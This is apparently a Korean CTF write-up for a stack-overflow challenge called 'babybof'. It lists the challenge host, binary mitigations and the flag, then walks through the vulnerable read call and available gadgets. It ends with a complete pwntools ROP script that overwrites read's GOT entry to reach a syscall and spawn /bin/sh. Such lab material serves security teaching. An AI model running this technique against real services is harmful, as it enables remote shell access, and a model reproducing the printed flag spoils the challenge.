# babybof

## 문제설명

ctf.skhudebug.xyz 30001

## 요약

- category : pwnable

- 의도 : read함수만 사용 가능한 상황에서 ROP exploit

## Flag

`debugCTF{Y0U_ARE_MAST3R_0F_R0P}`



## 문제실행방법

``docker-compose up -d --build``



## Mitigation

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

## Sources

- [babybof](./deploy/babybof): 바이너리
- [babybof.c](./deploy/babybof.c)

## Exploit

#### phase 1 : 취약점 분석

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [rsp+0h] [rbp-D0h]

  initialize(argc, argv, envp);
  read(0, &buf, 0x1F4uLL);
  return 0;
}
```

read함수에서 buf 변수의 크기보다 많은 사이즈의 데이터를 입력받는다.

`overflow` 가 발생하는 것을 알 수 있다.

ROP를 진행하기 위해 사용가능한 함수를 확인한다.



- 사용가능한 함수

```assembly
pwndbg> info func
All defined functions:

Non-debugging symbols:
0x0000000000400520  _init
0x0000000000400550  alarm@plt
0x0000000000400560  read@plt
0x0000000000400570  __libc_start_main@plt
0x0000000000400580  signal@plt
0x0000000000400590  setvbuf@plt
0x00000000004005a0  exit@plt
0x00000000004005c0  _start
0x00000000004005f0  deregister_tm_clones
0x0000000000400630  register_tm_clones
0x0000000000400670  __do_global_dtors_aux
0x0000000000400690  frame_dummy
0x00000000004006b6  _a
0x00000000004006c7  _b
0x00000000004006d0  alarm_handler
0x00000000004006de  initialize
0x000000000040073a  main
0x0000000000400770  __libc_csu_init
0x00000000004007e0  __libc_csu_fini
0x00000000004007e4  _fini
```

 `read`함수와 같이 `ROP` 가젯으로 사용하기 위한 출력함수(`write`)가 없다. 

따라서 syscall을 호출해서 문제를 풀어야 한다.



#### Phase 2 : ROP gadget

```assembly
public _a
_a proc near
; __unwind {
push    rbp
mov     rbp, rsp
xor     rax, rax
xor     rax, rbx
xor     rdx, rdx
retn
```

```assembly
public _b
_b proc near
; __unwind {
push    rbp
mov     rbp, rsp
pop     rbx
retn
```

_a, _b 함수에 ROP를 위한 가젯이 주어진다.

_a, _b 함수를 이용해 rax에 원하는 값을, rbx를 0으로 만들면서 syscall 호출이 가능해진다.

그 외 pop rdi, pop rsi 가젯도 찾아준다.



#### Pahse 3 : exploit

```python
from pwn import *

p = remote('ctf.skhudebug.xyx', 30001)
elf = ELF('babybof')

bss = elf.bss()+200
read_plt = elf.plt['read']
read_got = elf.got['read']
pop_rdi = 0x400833
pop_rsi_r15 = 0x400831
pop_rbx = 0x40071b
xor_eax_ebx = 0x40070a

payload = "A"*216
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi_r15)
payload += p64(bss)
payload += p64(0)
payload += p64(read_plt)

payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi_r15)
payload += p64(read_got)
payload += p64(0)
payload += p64(read_plt)

payload += p64(pop_rbx)
payload += p64(59)

payload += p64(xor_eax_ebx)

payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(pop_rsi_r15)
payload += p64(0)
payload += p64(0)
payload += p64(read_plt)

sleep(1)
p.send(payload)
sleep(1)
p.send('/bin/sh\x00')
sleep(1)
p.send('\x1e')
sleep(1)
p.interactive()
```



주어진 libc 파일로 read함수를 통해 호출되는 syscall의 마지막 1바이트 주소를 찾아내 exploit한다.